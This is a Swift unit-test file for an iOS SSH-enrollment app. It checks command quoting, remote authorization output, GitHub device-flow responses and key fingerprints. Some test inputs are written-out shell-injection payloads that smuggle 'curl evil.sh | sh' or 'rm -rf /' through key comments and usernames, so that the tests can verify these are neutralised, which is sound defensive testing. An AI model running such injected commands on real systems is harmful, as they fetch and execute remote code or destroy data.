import XCTest

@testable import RemoteCraft

/// The enrollment command is pasted into a shell on someone else's machine, with sudo
/// behind it. It has to be exactly right, and it has to be impossible for a text field on
/// a phone to turn it into a second command.
final class EnrollmentCommandTests: XCTestCase {
    private let line = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGFSO8jsBtB5yb9TBe2PxsPPAusNWecJZrp+E9rth6qVu3/KLxOMEIOUUmcsTynO69LEupudKPWRJLpPgq88xCY= remote-craft@iphone"

    func testKeyCommandQuotesTheWholeLine() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: line),
                       "omarchy-setup-security-sshd --key=\"\(line)\"")
    }

    /// A key with no line at all — an imported RSA key — still yields something runnable:
    /// the interactive form of the same script.
    func testMissingKeyFallsBackToTheInteractiveScript() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: "   "), "omarchy-setup-security-sshd")
    }

    /// An imported key's comment is a name the user typed. A name with a `"` in it must
    /// not be able to close the quote and append a second command to a line that is
    /// about to be pasted into a root-capable shell on another machine.
    func testKeyCommandCannotBeEscapedByAKeyComment() {
        let hostile = "ssh-ed25519 AAAAC3Nz my\"; curl evil.sh | sh; echo \"key"

        let command = Omarchy.enrollCommand(publicLine: hostile)

        XCTAssertEqual(command,
                       "omarchy-setup-security-sshd --key=\"ssh-ed25519 AAAAC3Nz my; curl evil.sh | sh; echo key\"")
        XCTAssertEqual(command.filter { $0 == "\"" }.count, 2)
    }

    /// A username field that can carry a `;` is a username field that can carry a second
    /// command, and this one is pasted into a root-capable shell. The trailing fallback
    /// is what makes the line runnable on a released Omarchy, where `--gh-keys` does not
    /// exist yet and the bare script asks for the username instead.
    func testGitHubUsernameIsFilteredNotQuoted() {
        XCTAssertEqual(Omarchy.githubCommand(username: "octocat; rm -rf /"),
                       "omarchy-setup-security-sshd --gh-keys octocatrm-rf || omarchy-setup-security-sshd")
        XCTAssertEqual(Omarchy.githubUsername("  Octo-Cat  "), "Octo-Cat")
    }

    /// Signed in with no login yet: the flag has nothing to carry, so the command is the
    /// interactive script alone rather than a `--gh-keys` with an empty argument, which
    /// is an error on every Omarchy that has the flag and an unknown option on the rest.
    func testGitHubCommandWithoutAUsernameIsTheInteractiveScript() {
        XCTAssertEqual(Omarchy.githubCommand(username: "  "), "omarchy-setup-security-sshd")
    }

    /// The second-device command runs over an SSH channel the app already has, so
    /// nobody will ever read it before it executes. Its two invariants — it cannot be
    /// escaped, and it cannot duplicate a line — have to be checked here instead.
    func testAuthorizeCommandIsIdempotentAndSingleQuoted() {
        let command = Omarchy.authorizeCommand(publicLine: line)

        // `-x` anchors the whole line, `-F` disables patterns: the base64 in a key is
        // full of `+` and `/` and must never be read as a regex.
        XCTAssertTrue(command.contains("grep -qxF '\(line)' ~/.ssh/authorized_keys || printf"))
        // sshd's StrictModes silently ignores a group-writable authorized_keys, so the
        // modes are set on every run, not only when the file is created.
        XCTAssertTrue(command.contains("install -d -m 700 ~/.ssh"))
        XCTAssertTrue(command.contains("chmod 600 ~/.ssh/authorized_keys"))
        XCTAssertTrue(command.hasSuffix("&& echo \(Omarchy.authorized)"))
    }

    /// An imported key's comment is user-typed text that ends up inside single quotes
    /// in a command executed on another machine. A `'` in it would close the quote.
    func testAuthorizeCommandCannotBeEscapedByAKeyComment() {
        let hostile = "ssh-ed25519 AAAAC3Nz my'; curl evil.sh | sh; echo '"

        let command = Omarchy.authorizeCommand(publicLine: hostile)

        XCTAssertFalse(command.contains("'; curl"))
        XCTAssertEqual(Omarchy.shellLiteral(hostile), "ssh-ed25519 AAAAC3Nz my; curl evil.sh | sh; echo")
    }

    /// An imported RSA key has no public line. There is nothing to append, and a
    /// command built from nothing would `grep` for the empty string — which matches
    /// every line in the file and reports success without writing anything.
    func testAuthorizeCommandRefusesABlankLine() {
        XCTAssertEqual(Omarchy.authorizeCommand(publicLine: "   \n "), "")
    }
}

/// The sentinel decides whether the app tells the user their key is on the box. Every
/// case below is output a real Omarchy box can produce on that same channel: sshd runs
/// an exec command through the login shell, and a themed `~/.bashrc` writes a screenful
/// before the first `grep` runs.
final class AuthorizeOutputTests: XCTestCase {
    func testSentinelIsAcceptedThroughShellNoise() {
        XCTAssertTrue(RemoteEnroll.read(output: Omarchy.authorized))
        XCTAssertTrue(RemoteEnroll.read(output: "omarchy 4.0.4\r\n\(Omarchy.authorized)\r\n"))
        XCTAssertTrue(RemoteEnroll.read(output: "  \(Omarchy.authorized)  \n"))
    }

    /// The word appears in this app's own text and in the command a shell may echo.
    /// A substring match here reports success for a key that never landed.
    func testSentinelIsNotMatchedInsideALine() {
        XCTAssertFalse(RemoteEnroll.read(output: "echo \(Omarchy.authorized)"))
        XCTAssertFalse(RemoteEnroll.read(output: "\(Omarchy.authorized)X"))
        XCTAssertFalse(RemoteEnroll.read(output: "running \(Omarchy.authorized) now"))
        XCTAssertFalse(RemoteEnroll.read(output: ""))
    }
}

/// Device flow has no client secret and no redirect, so every signal the app gets is a
/// status code and a JSON body. Two of its failures are mistakes in the app's own
/// registration rather than anything the user did, which is why these are named cases
/// and not a string.
final class GitHubDeviceFlowTests: XCTestCase {
    private func json(_ text: String) -> Data { Data(text.utf8) }

    func testIssuedCodeCarriesItsOwnDeadline() {
        let now = Date(timeIntervalSinceReferenceDate: 0)
        let body = json(#"{"device_code":"abc","user_code":"WDJB-MJHT","verification_uri":"https://github.com/login/device","expires_in":900,"interval":5}"#)

        guard case .issued(let code) = GitHubAuth.read(deviceCodeStatus: 200, body: body, now: now) else {
            return XCTFail("expected an issued code")
        }
        XCTAssertEqual(code.userCode, "WDJB-MJHT")
        XCTAssertEqual(code.interval, 5)
        // A deadline, not an attempt count: `slow_down` grows the interval, so counting
        // attempts would end the login at a different real time on a slow server.
        XCTAssertEqual(code.expiresAt, now.addingTimeInterval(900))
    }

    /// Device flow is off by default on a new registration. Whoever sets this app up
    /// hits it before any user does, and "GitHub answered 400" would send them
    /// debugging the network instead of ticking a checkbox.
    func testDeviceFlowDisabledIsItsOwnCase() {
        XCTAssertEqual(GitHubAuth.read(deviceCodeStatus: 400,
                                       body: json(#"{"error":"device_flow_disabled"}"#)),
                       .disabled)
    }

    /// The exact reply `POST /login/device/code` gives for a client id GitHub has never
    /// seen, captured from the live endpoint. It is the first error a new deployment
    /// hits, and the generic path renders it as "GitHub said Not Found." — true, and no
    /// help at all in finding the setting that is wrong.
    func testUnknownClientIDNamesTheSetting() {
        XCTAssertEqual(GitHubAuth.read(deviceCodeStatus: 404,
                                       body: json(#"{"error":"Not Found"}"#)),
                       .failed("GitHub does not recognize this client id. Check RCGitHubClientID in Info.plist."))
    }

    func testPollDistinguishesWaitingFromRefusalAndDeath() {
        XCTAssertEqual(GitHubAuth.read(pollStatus: 200, body: json(#"{"error":"authorization_pending"}"#)), .pending)
        XCTAssertEqual(GitHubAuth.read(pollStatus: 200, body: json(#"{"error":"slow_down","interval":10}"#)), .slowDown)
        XCTAssertEqual(GitHubAuth.read(pollStatus: 200, body: json(#"{"error":"access_denied"}"#)), .denied)
        XCTAssertEqual(GitHubAuth.read(pollStatus: 200, body: json(#"{"error":"expired_token"}"#)), .expired)
        XCTAssertEqual(GitHubAuth.read(pollStatus: 200, body: json(#"{"access_token":"gho_x","token_type":"bearer"}"#)),
                       .token("gho_x"))
    }

    /// GitHub's OAuth endpoints answer form-encoded unless asked for JSON. If the
    /// `Accept` header is ever dropped, a successful login has to fail loudly rather
    /// than parse as a token the app then sends to the API forever.
    func testFormEncodedBodyIsNotReadAsSuccess() {
        XCTAssertNotEqual(GitHubAuth.read(pollStatus: 200, body: json("access_token=gho_x&token_type=bearer")),
                          .token("gho_x"))
    }

    /// 422 is what GitHub returns for a key already on the account. Re-running
    /// enrollment after a crash is normal, and a hard failure there is a dead end on
    /// the one screen the whole app depends on.
    func testPublishTreatsAnExistingKeyAsSuccess() {
        XCTAssertEqual(GitHubAuth.read(publishStatus: 201, body: Data()), .published)
        XCTAssertEqual(GitHubAuth.read(publishStatus: 422, body: json(#"{"message":"key is already in use"}"#)),
                       .alreadyPresent)
        XCTAssertTrue(GitHubAuth.read(publishStatus: 422, body: Data()).isUsable)
    }

    /// A revoked token and a token that was never granted the permission need opposite
    /// advice: sign in again, versus fix the app registration.
    func testPublishSeparatesARevokedTokenFromAMissingPermission() {
        XCTAssertEqual(GitHubAuth.read(publishStatus: 401, body: Data()), .unauthorized)
        XCTAssertEqual(GitHubAuth.read(publishStatus: 403, body: Data()), .forbidden)
        XCTAssertFalse(GitHubAuth.read(publishStatus: 403, body: Data()).isUsable)
    }

    /// GitHub's edge serves HTML on some 5xx. Parsing it as JSON must not take the
    /// sign-in screen down with it.
    func testNonJSONErrorBodyIsReported() {
        XCTAssertEqual(GitHubAuth.read(pollStatus: 503, body: json("<html>502 Bad Gateway</html>")),
                       .failed("GitHub answered 503"))
    }
}

/// The fingerprint is the only part of a key a person will ever compare by eye, so it has
/// to match what `ssh-keygen -l` prints for the same key, character for character.
final class FingerprintTests: XCTestCase {
    func testFingerprintMatchesSSHKeygen() {
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKvmFb2yt76bPHoXj+YC8d12XfXR9bx3mQP61RN82vcr vector"

        XCTAssertEqual(OpenSSHWire.fingerprint(ofPublicLine: line),
                       "SHA256:7OUCCteJ+DEL3EH/Mp6wpFZXcoub1BE2++HWHjUbTbU")
    }

    /// An imported RSA key has no public line, and inventing a fingerprint for it would
    /// be worse than admitting there is not one.
    func testUnparseableLineHasNoFingerprint() {
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: ""))
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: "ssh-ed25519"))
    }
}
